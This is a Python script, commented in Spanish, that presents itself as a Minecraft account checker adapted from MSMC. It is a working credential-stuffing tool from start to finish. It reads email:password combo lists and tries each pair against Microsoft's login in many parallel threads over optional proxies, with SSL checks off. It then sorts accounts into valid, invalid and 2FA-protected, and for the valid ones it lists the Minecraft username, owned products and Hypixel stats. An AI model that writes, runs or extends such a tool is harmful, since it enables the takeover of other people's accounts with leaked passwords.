import requests
import re
import json
import time
import random
import urllib3
import threading
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import os
from datetime import datetime

# Inicializar colorama
init(autoreset=True)

# Deshabilitar warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MinecraftAccountChecker:
    def __init__(self, proxy=None, max_retries=3):
        self.session = requests.Session()
        self.session.verify = False
        self.max_retries = max_retries
        
        # Configurar retries
        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        if proxy:
            self.session.proxies = proxy
            
        self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

    def get_urlPost_sFTTag(self):
        """Obtiene los tokens iniciales para la autenticación"""
        retries = 0
        while retries < self.max_retries:
            try:
                text = self.session.get(self.sFTTag_url, timeout=15).text
                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sFTTag = match.group(1)
                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match:
                        return match.group(1), sFTTag
            except Exception:
                retries += 1
                time.sleep(1)
        return None, None

    def get_xbox_token(self, email, password, urlPost, sFTTag):
        """Autentica con Microsoft y obtiene token de Xbox"""
        retries = 0
        while retries < self.max_retries:
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                login_request = self.session.post(urlPost, data=data, 
                                                headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                                                allow_redirects=True, timeout=15)
                
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "SUCCESS"
                        
                # Manejar casos especiales
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        data = {
                            'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                            'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                        }
                        ret = self.session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                        fin = self.session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, "SUCCESS"
                    except:
                        pass
                        
                elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return None, "2FA_REQUIRED"
                    
                elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                    return None, "INVALID_CREDENTIALS"
                    
            except Exception as e:
                retries += 1
                time.sleep(1)
                
        return None, "AUTH_FAILED"

    def get_minecraft_token(self, xbox_token):
        """Obtiene el token de Minecraft usando el token de Xbox"""
        retries = 0
        while retries < self.max_retries:
            try:
                # Autenticar con Xbox Live
                xbox_login = self.session.post('https://user.auth.xboxlive.com/user/authenticate', 
                                             json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": xbox_token}, 
                                                   "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, 
                                             headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                                             timeout=15)
                
                if xbox_login.status_code != 200:
                    retries += 1
                    continue
                    
                js = xbox_login.json()
                xbox_token = js.get('Token')
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                
                # Obtener token XSTS
                xsts = self.session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, 
                                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, 
                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                                       timeout=15)
                
                if xsts.status_code != 200:
                    retries += 1
                    continue
                    
                js = xsts.json()
                xsts_token = js.get('Token')
                
                # Obtener token de Minecraft
                mc_login = self.session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                                           headers={'Content-Type': 'application/json'}, 
                                           timeout=15)
                
                if mc_login.status_code == 200:
                    return mc_login.json().get('access_token')
                elif mc_login.status_code == 429:
                    time.sleep(2)
                    retries += 1
                else:
                    retries += 1
                    
            except Exception:
                retries += 1
                time.sleep(1)
                
        return None

    def get_minecraft_profile(self, mc_token):
        """Obtiene el perfil de Minecraft (IGN)"""
        retries = 0
        while retries < self.max_retries:
            try:
                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', 
                                   headers={'Authorization': f'Bearer {mc_token}'})
                
                if r.status_code == 200:
                    profile_data = r.json()
                    return {
                        'username': profile_data.get('name', 'N/A'),
                        'uuid': profile_data.get('id', 'N/A'),
                        'capes': ", ".join([cape["alias"] for cape in profile_data.get("capes", [])]),
                        'success': True
                    }
                elif r.status_code == 429:
                    time.sleep(2)
                    retries += 1
                else:
                    return {'success': False, 'error': f'HTTP {r.status_code}'}
                    
            except Exception as e:
                retries += 1
                time.sleep(1)
                
        return {'success': False, 'error': 'Max retries exceeded'}

    def check_account_ownership(self, mc_token):
        """Verifica qué productos de Minecraft posee la cuenta"""
        retries = 0
        while retries < self.max_retries:
            try:
                checkrq = self.session.get('https://api.minecraftservices.com/entitlements/license', 
                                         headers={'Authorization': f'Bearer {mc_token}'})
                
                if checkrq.status_code == 200:
                    items = checkrq.json().get("items", [])
                    
                    has_normal_minecraft = False
                    has_game_pass_pc = False
                    has_game_pass_ultimate = False
                    
                    for item in items:
                        name = item.get("name", "")
                        source = item.get("source", "")
                        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
                            has_normal_minecraft = True
                        if name == "product_game_pass_pc":
                            has_game_pass_pc = True
                        if name == "product_game_pass_ultimate":
                            has_game_pass_ultimate = True
                    
                    # Determinar tipo de cuenta
                    if has_normal_minecraft and has_game_pass_pc:
                        return "Minecraft Normal (con Game Pass PC)"
                    if has_normal_minecraft and has_game_pass_ultimate:
                        return "Minecraft Normal (con Game Pass Ultimate)"
                    elif has_normal_minecraft:
                        return "Minecraft Normal"
                    elif has_game_pass_ultimate:
                        return "Xbox Game Pass Ultimate"
                    elif has_game_pass_pc:
                        return "Xbox Game Pass PC"
                    else:
                        # Verificar otros productos
                        others = []
                        if any('product_minecraft_bedrock' in item.get("name", "") for item in items):
                            others.append("Minecraft Bedrock")
                        if any('product_legends' in item.get("name", "") for item in items):
                            others.append("Minecraft Legends")
                        if any('product_dungeons' in item.get("name", "") for item in items):
                            others.append('Minecraft Dungeons')
                        
                        if others:
                            return f"Otros: {', '.join(others)}"
                        else:
                            return "Solo Correo Válido"
                            
                elif checkrq.status_code == 429:
                    time.sleep(2)
                    retries += 1
                else:
                    return "Error verificando productos"
                    
            except Exception:
                retries += 1
                time.sleep(1)
                
        return "Error en verificación"

    def get_hypixel_stats(self, username):
        """Obtiene estadísticas de Hypixel (extraída del código original)"""
        try:
            tx = requests.get('https://plancke.io/hypixel/player/stats/'+username, 
                            proxies=self.session.proxies, 
                            headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, 
                            verify=False).text
            
            stats = {}
            try: 
                stats['level'] = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except: pass
            try: 
                stats['first_login'] = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except: pass
            try: 
                stats['last_login'] = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except: pass
            try: 
                stats['bw_stars'] = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
            except: pass
            
            return stats
        except:
            return {}

    def get_optifine_cape(self, username):
        """Verifica si tiene capa de Optifine"""
        try:
            txt = requests.get(f'http://s.optifine.net/capes/{username}.png', 
                             proxies=self.session.proxies, verify=False).text
            return "No" if "Not found" in txt else "Sí"
        except:
            return "Desconocido"

    def verify_account(self, email, password):
        """Verifica una cuenta completa de Minecraft"""
        result = {
            "success": False,
            "email": email,
            "error": "",
            "minecraft_profile": {},
            "account_type": "",
            "hypixel_stats": {},
            "optifine_cape": ""
        }
        
        try:
            # Paso 1: Obtener tokens iniciales
            urlPost, sFTTag = self.get_urlPost_sFTTag()
            if not urlPost:
                result["error"] = "No se pudieron obtener tokens iniciales"
                return result
            
            # Paso 2: Autenticar con Microsoft
            xbox_token, auth_status = self.get_xbox_token(email, password, urlPost, sFTTag)
            
            if auth_status != "SUCCESS":
                result["error"] = auth_status
                return result
            
            # Paso 3: Obtener token de Minecraft
            mc_token = self.get_minecraft_token(xbox_token)
            if not mc_token:
                result["error"] = "No se pudo obtener token de Minecraft"
                return result
            
            # Paso 4: Obtener perfil de Minecraft
            profile = self.get_minecraft_profile(mc_token)
            if not profile['success']:
                result["error"] = profile['error']
                return result
            
            # Paso 5: Verificar productos
            account_type = self.check_account_ownership(mc_token)
            
            # Paso 6: Obtener estadísticas adicionales si tiene IGN
            hypixel_stats = {}
            optifine_cape = ""
            
            if profile['username'] != 'N/A':
                hypixel_stats = self.get_hypixel_stats(profile['username'])
                optifine_cape = self.get_optifine_cape(profile['username'])
            
            result.update({
                "success": True,
                "minecraft_profile": profile,
                "account_type": account_type,
                "hypixel_stats": hypixel_stats,
                "optifine_cape": optifine_cape
            })
            
        except Exception as e:
            result["error"] = f"Error inesperado: {str(e)}"
            
        return result

class CheckerManager:
    def __init__(self, threads=10, proxy=None):
        self.threads = threads
        self.proxy = proxy
        self.results = {
            'valid': 0,
            'invalid': 0,
            '2fa': 0,
            'valid_mail': 0,
            'errors': 0
        }
        self.valid_accounts = []
        
    def check_account(self, combo):
        """Verifica una cuenta individual"""
        try:
            email, password = combo.strip().split(':', 1)
            checker = MinecraftAccountChecker(proxy=self.proxy)
            result = checker.verify_account(email, password)
            
            return result
        except Exception as e:
            return {"success": False, "error": f"Error procesando combo: {str(e)}", "email": combo.split(':')[0] if ':' in combo else combo}

    def worker(self, combo):
        """Worker para threading"""
        result = self.check_account(combo)
        self.process_result(result)
        return result

    def process_result(self, result):
        """Procesa y muestra el resultado"""
        if result["success"]:
            self.results['valid'] += 1
            self.valid_accounts.append(result)
            
            print(f"{Fore.GREEN}✅ VÁLIDA: {result['email']}")
            print(f"   👤 IGN: {result['minecraft_profile']['username']}")
            print(f"   🎮 Tipo: {result['account_type']}")
            
            if result['hypixel_stats']:
                print(f"   📊 Hypixel: Nvl {result['hypixel_stats'].get('level', 'N/A')} | BW {result['hypixel_stats'].get('bw_stars', 'N/A')}★")
            
        else:
            if result["error"] == "INVALID_CREDENTIALS":
                self.results['invalid'] += 1
                print(f"{Fore.RED}❌ INVALIDA: {result['email']}")
            elif result["error"] == "2FA_REQUIRED":
                self.results['2fa'] += 1
                print(f"{Fore.YELLOW}⚠️  2FA: {result['email']}")
            elif "Solo Correo" in result.get("account_type", ""):
                self.results['valid_mail'] += 1
                print(f"{Fore.BLUE}📧 CORREO VÁLIDO: {result['email']}")
            else:
                self.results['errors'] += 1
                print(f"{Fore.MAGENTA}❓ ERROR: {result['email']} - {result['error']}")

    def check_from_file(self, filename):
        """Verifica cuentas desde archivo"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                accounts = [line.strip() for line in f if ':' in line]
            
            print(f"{Fore.CYAN}📁 Verificando {len(accounts)} cuentas...")
            print(f"{Fore.CYAN}🧵 Usando {self.threads} hilos...")
            print("-" * 50)
            
            start_time = time.time()
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                list(executor.map(self.worker, accounts))
            
            end_time = time.time()
            self.display_final_results(end_time - start_time)
            
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Archivo no encontrado: {filename}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error leyendo archivo: {str(e)}")

    def display_final_results(self, elapsed_time):
        """Muestra resultados finales"""
        print("\n" + "="*50)
        print(f"{Fore.CYAN}📊 RESULTADOS FINALES:")
        print(f"{Fore.GREEN}✅ Válidas: {self.results['valid']}")
        print(f"{Fore.RED}❌ Inválidas: {self.results['invalid']}")
        print(f"{Fore.YELLOW}⚠️  2FA: {self.results['2fa']}")
        print(f"{Fore.BLUE}📧 Correos Válidos: {self.results['valid_mail']}")
        print(f"{Fore.MAGENTA}❓ Errores: {self.results['errors']}")
        print(f"{Fore.CYAN}⏱️  Tiempo: {elapsed_time:.2f} segundos")
        
        if self.valid_accounts:
            print(f"\n{Fore.CYAN}📝 CUENTAS VÁLIDAS:")
            for acc in self.valid_accounts:
                print(f"  {Fore.GREEN}{acc['email']} | {acc['minecraft_profile']['username']} | {acc['account_type']}")

def main():
    print(f"{Fore.GREEN}=== VERIFICADOR DE CUENTAS MINECRAFT ===")
    print(f"{Fore.CYAN}Extraído y adaptado del código original MSMC")
    print()
    
    try:
        # Configuración
        try:
            threads = int(input("Hilos (recomendado 10-50): ").strip() or "10")
        except:
            threads = 10
            
        proxy = None
        use_proxy = input("Usar proxy? (s/n): ").strip().lower()
        if use_proxy == 's':
            proxy_type = input("Tipo (1: HTTP, 2: SOCKS4, 3: SOCKS5): ").strip()
            proxy_addr = input("Proxy (ip:puerto): ").strip()
            
            if proxy_type == '1':
                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
            elif proxy_type == '2':
                proxy = {'http': f'socks4://{proxy_addr}', 'https': f'socks4://{proxy_addr}'}
            elif proxy_type == '3':
                proxy = {'http': f'socks5://{proxy_addr}', 'https': f'socks5://{proxy_addr}'}
        
        manager = CheckerManager(threads=threads, proxy=proxy)
        
        while True:
            print(f"\n{Fore.CYAN}1. Verificar cuenta individual")
            print(f"{Fore.CYAN}2. Verificar desde archivo")
            print(f"{Fore.CYAN}3. Salir")
            
            choice = input(f"\n{Fore.WHITE}Selecciona una opción: ").strip()
            
            if choice == "1":
                email = input("Email: ").strip()
                password = input("Contraseña: ").strip()
                
                checker = MinecraftAccountChecker(proxy=proxy)
                result = checker.verify_account(email, password)
                
                manager.process_result(result)
                
            elif choice == "2":
                filename = input("Archivo con cuentas (email:password): ").strip()
                manager.check_from_file(filename)
                
            elif choice == "3":
                print(f"{Fore.GREEN}¡Hasta luego!")
                break
            else:
                print(f"{Fore.RED}❌ Opción inválida")
                
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido por el usuario")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {str(e)}")

if __name__ == "__main__":
    main()
